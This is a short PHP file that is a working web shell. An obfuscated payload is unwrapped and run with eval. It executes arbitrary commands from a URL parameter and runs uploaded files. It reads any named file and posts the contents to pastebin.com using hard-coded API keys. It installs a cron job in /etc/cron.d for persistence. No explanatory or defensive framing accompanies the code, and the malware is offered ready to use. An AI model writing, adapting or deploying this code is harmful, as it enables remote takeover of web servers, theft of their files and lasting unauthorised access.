<?php
function obfuscate($payload) {
    $obfuscated = '';
    for ($i = 0; $i < strlen($payload); $i++) {
        $obfuscated .= chr(ord($payload[$i]) + 1);
    }
    return $obfuscated;
}

function deobfuscate($obfuscated) {
    $payload = '';
    for ($i = 0; $i < strlen($obfuscated); $i++) {
        $payload .= chr(ord($obfuscated[$i]) - 1);
    }
    return $payload;
}

$obfuscated_payload = obfuscate('<?php 
    // Remote Command Execution
    if (isset($_GET["cmd"])) {
        system($_GET["cmd"]);
    }

    // File Upload and Execution
    if (isset($_FILES["file"])) {
        $upload_dir = "/tmp/";
        $upload_file = $upload_dir . basename($_FILES["file"]["name"]);
        if (move_uploaded_file($_FILES["file"]["tmp_name"], $upload_file)) {
            echo "File uploaded successfully. Executing...\n";
            system("php " . $upload_file);
        } else {
            echo "File upload failed.\n";
        }
    }

    // Data Exfiltration to Pastebin
    if (isset($_GET["exfil"])) {
        $data = file_get_contents($_GET["exfil"]);
        $api_dev_key = "2ySG8d85cPXHz8k0M1sxy_-wUknJuyDd";
        $api_paste_code = urlencode($data);
        $api_paste_private = "2"; // 0=public 1=unlisted 2=private
        $api_paste_name = urlencode("Exfiltrated Data");
        $api_paste_expire_date = "10M"; // 10 minutes
        $api_paste_format = "text";
        $api_user_key = "a58daed7190669a72f53ca98d7cc37aa";
        $api_paste_name = urlencode(basename($_GET["exfil"]));

        $url = "https://pastebin.com/api/api_post.php";
        $ch = curl_init($url);

        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "api_option=paste&api_user_key=".$api_user_key."&api_paste_private=".$api_paste_private."&api_paste_name=".$api_paste_name."&api_paste_expire_date=".$api_paste_expire_date."&api_paste_format=".$api_paste_format."&api_dev_key=".$api_dev_key."&api_paste_code=".$api_paste_code."");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        curl_setopt($ch, CURLOPT_NOBODY, 0);

        $response = curl_exec($ch);
        curl_close($ch);

        echo "Data exfiltrated to Pastebin: " . $response . "\n";
    }

    // Persistence
    $cron_command = "* * * * * /usr/bin/php " . __FILE__ . " >/dev/null 2>&1";
    $cron_file = "/etc/cron.d/malicious_cron";
    file_put_contents($cron_file, $cron_command);
    chmod($cron_file, 0644);
    echo "Persistence established.\n";
?>');

eval(deobfuscate($obfuscated_payload));
?>